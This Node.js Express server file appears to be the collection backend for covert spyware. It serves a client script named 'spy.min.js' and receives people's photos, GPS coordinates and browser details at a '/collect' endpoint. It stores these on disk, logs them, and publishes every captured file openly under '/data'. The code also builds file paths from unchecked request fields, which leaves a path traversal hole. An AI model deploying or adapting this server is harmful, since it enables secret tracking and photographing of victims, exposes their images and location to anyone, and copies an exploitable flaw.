const express = require('express');
const cors = require('cors');
const fs = require('fs-extra');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.raw({ type: '*/*', limit: '10mb' }));

const DATA_DIR = path.join(__dirname, 'data');
fs.ensureDirSync(DATA_DIR);

// Serve client files (spy.min.js, index.html)
app.use(express.static(path.join(__dirname, '../client')));

// Serve public files at root
app.use(express.static(path.join(__dirname, '../public')));

// Main data collection endpoint
app.post('/collect', (req, res) => {
  try {
    const raw = req.body.toString();
    let data;
    try { 
      data = JSON.parse(raw); 
    } catch { 
      return res.sendStatus(400); 
    }

    const { uid, img, gps, ts, ua } = data;
    const filename = `${uid}_${ts}.json`;
    fs.writeJsonSync(path.join(DATA_DIR, filename), data, { spaces: 2 });

    if (img) {
      const imgPath = path.join(DATA_DIR, `${uid}_${ts}.jpg`);
      fs.writeFileSync(imgPath, Buffer.from(img, 'base64'));
    }

    console.log(`[+] ${uid} | GPS: ${gps} | Photo: ${img ? 'YES' : 'NO'}`);
    res.sendStatus(200);
  } catch (e) {
    console.error(e);
    res.sendStatus(500);
  }
});

// Serve data files
app.use('/data', express.static(DATA_DIR));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});